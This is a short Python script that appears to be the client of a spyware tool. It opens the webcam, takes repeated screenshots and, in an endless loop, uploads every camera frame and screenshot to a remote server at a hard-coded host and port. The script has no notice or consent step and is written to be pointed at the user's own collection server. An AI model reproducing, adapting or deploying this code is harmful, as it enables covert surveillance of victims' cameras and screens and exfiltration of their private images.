import cv2
import requests
import pyautogui
import numpy as np

# Write here your server ip
remote_server = 'c5.play2go.cloud:20015'

# camera initialization
try:
    camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
except Exception as e:
    camera = cv2.VideoCapture('NoCamera.avi')
    print(e)

clientIdreq = requests.post(f'http://{remote_server}/client')
clientId = clientIdreq.text


while True:
    if camera:
        success, frame = camera.read()
        if not success or frame is None:
            break

    myScreenshot = pyautogui.screenshot()
    myScreenshot_np = np.array(myScreenshot)

    # images to .jpg
    _, camera_jpg = cv2.imencode('.jpg', frame)
    _, screen_jpg = cv2.imencode('.jpg', myScreenshot_np)

    # sending frames to server
    img_response = requests.post(f'http://{remote_server}/send_camera?id={clientId}', data=camera_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
    screen_response = requests.post(f'http://{remote_server}/send_screen?id={clientId}', data=screen_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})

    if img_response.status_code != 200:
        print(f"Error when sending a frame to the server: {img_response.status_code}")
    if screen_response.status_code != 200:
        print(f"Error when sending a screenshot to the server: {screen_response.status_code}")

if camera:
    camera.release()
